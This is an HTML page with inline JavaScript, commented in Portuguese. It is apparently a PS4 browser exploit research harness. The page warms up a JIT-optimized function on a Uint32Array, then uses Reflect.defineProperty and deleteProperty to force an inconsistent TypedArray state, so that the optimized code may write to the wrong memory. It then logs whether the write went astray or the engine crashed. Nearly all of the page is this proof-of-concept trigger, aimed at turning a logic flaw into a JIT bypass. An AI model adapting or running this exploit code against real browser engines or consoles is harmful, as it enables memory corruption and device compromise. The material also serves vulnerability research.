
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <title>PS4 Security Research - Memory Corruption Test</title>
    <style>
        body {
            background-color: #121212;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        #console {
            background-color: #000;
            border: 1px solid #333;
            padding: 15px;
            height: 400px;
            overflow-y: scroll;
            margin-bottom: 20px;
            white-space: pre-wrap;
        }
        button {
            background-color: #004400;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px 20px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #006600;
        }
        .error { color: #ff0000; font-weight: bold; }
        .success { color: #ffff00; font-weight: bold; }
        .header { color: #44aaff; margin-bottom: 10px; }
    </style>
</head>
<body>

    <h2>Harness de Teste: Corrupção por Invariante de TypedArray</h2>
    <div class="header">Este teste tenta converter uma falha lógica de descritor num bypass de JIT.</div>
    
    <div id="console"></div>
    
    <button id="startBtn">Executar Teste de Intensidade</button>

    <script>
        const $console = document.getElementById('console');
        
        function log(msg, className = "") {
            const span = document.createElement('div');
            span.className = className;
            span.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
            $console.appendChild(span);
            $console.scrollTop = $console.scrollHeight;
        }

        // 1. Função que será otimizada pelo JIT
        // O compilador vai assumir que 'arr' é sempre um Uint32Array estável.
        function jitTarget(arr, val) {
            for (let i = 0; i < 1; i++) {
                arr[0] = val;
            }
        }

        async function runTest() {
            log("Iniciando Fase 1: Aquecimento do JIT (Warm-up)...");
            
            const buffer = new ArrayBuffer(0x1000);
            const ta = new Uint32Array(buffer);
            ta[0] = 0x11223344;

            // Aquecer o motor para otimização agressiva
            for (let i = 0; i < 100000; i++) {
                jitTarget(ta, 0x99999999);
            }
            
            log("JIT otimizado. Iniciando Fase 2: Trigger da Invariante...");

            try {
                // Forçar o estado "impossível" que o log anterior detetou
                const success = Reflect.defineProperty(ta, "0", {
                    value: 0xDEADBEEF,
                    configurable: true,
                    writable: true,
                    enumerable: true
                });

                if (success) {
                    log("CONTRADIÇÃO ATIVA: O motor aceitou 'configurable: true' num índice fixo!", "success");
                    
                    log("Iniciando Fase 3: Tentativa de Bypass/Corrupção...");
                    
                    // Tentamos apagar a propriedade. Num TypedArray isto não deve ser possível.
                    // Se o JIT não validar que a propriedade 0 foi "mexida", ele pode escrever em memória errada.
                    Reflect.deleteProperty(ta, "0");

                    // Chamada ao código otimizado com o estado corrompido
                    jitTarget(ta, 0x41414141);

                    log("Verificando integridade da memória...");
                    if (ta[0] === 0x41414141) {
                        log("Escrita bem-sucedida (Comportamento Standard).");
                    } else {
                        log("ALERTA: O valor final é 0x" + ta[0].toString(16) + " - Possível desvio de memória!", "error");
                    }
                } else {
                    log("O motor bloqueou a redefinição (Bug mitigado ou falha no trigger).");
                }

            } catch (e) {
                log("CRASH/ERRO DETECTADO: " + e.message, "error");
                log("Nota: Se o navegador fechar sozinho agora, o crash foi no kernel/processo nativo.", "success");
            }
            
            log("Teste concluído.");
        }

        document.getElementById('startBtn').addEventListener('click', () => {
            $console.innerHTML = "";
            runTest();
        });
    </script>
</body>
</html>
